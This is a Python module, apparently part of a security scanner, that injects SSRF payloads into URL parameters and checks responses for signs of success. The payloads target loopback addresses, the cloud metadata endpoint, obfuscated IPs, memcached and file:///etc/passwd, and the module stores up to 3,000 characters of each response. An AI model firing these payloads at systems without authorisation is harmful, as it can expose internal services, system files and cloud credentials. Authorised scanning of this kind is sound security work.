import requests
from urllib.parse import urlparse, parse_qs, urlencode
from config import DEFAULT_TIMEOUT
from modules.vuln.waf_aware_classifier import classify_signature_match

SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://169.254.169.254/",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    "http://2130706433/",
    "http://017700000001/",
    "dict://127.0.0.1:11211/",
    "file:///etc/passwd",
    "http://internal.service/",
]

SSRF_INDICATORS = [
    "root:x:", "daemon:", "/bin/bash",
    "ami-id", "instance-id", "instance-type",
    "Connection refused", "Connection timed out",
    "Name or service not known",
]


def scan_ssrf(url: str) -> list:
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    url_params = [k for k in params if any(kw in k.lower() for kw in
                  ["url", "uri", "link", "src", "source", "dest", "redirect", "path", "file", "load"])]
    if not url_params:
        url_params = list(params.keys())[:3]

    session = requests.Session()
    session.headers["User-Agent"] = "OPTISEC-ReconPro/1.0 (Security Testing)"

    for param in url_params:
        # Only the CONFIRMED entry (if any) or the last non-reporting verdict
        # tried for this param is kept — one row per param, not one per
        # payload, so retaining WAF_BLOCKED/etc. doesn't multiply findings.
        pending = None
        for payload in SSRF_PAYLOADS:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
            try:
                r = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                body_lower = r.text.lower()
                matched_indicator = next((ind for ind in SSRF_INDICATORS if ind.lower() in body_lower), None)
                result = classify_signature_match(
                    r.status_code, r.headers, r.text, matched_indicator,
                    severity="Critical", signal_label="SSRF indicator",
                )
                entry = {
                    "type": "SSRF",
                    "severity": result.severity,
                    "url": test_url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": result.reason,
                    "waf_detected": result.waf_detected,
                    "verdict": result.verdict,
                    "status_code": r.status_code,
                    "response_body": r.text[:3000],
                }
                if result.verdict == "ENDPOINT_INVALID":
                    pending = entry  # path itself is unreachable, no point trying more payloads
                    break
                if result.should_report:
                    findings.append(entry)
                    pending = None
                    break
                pending = entry
            except Exception:
                continue
        if pending is not None:
            findings.append(pending)

    return findings
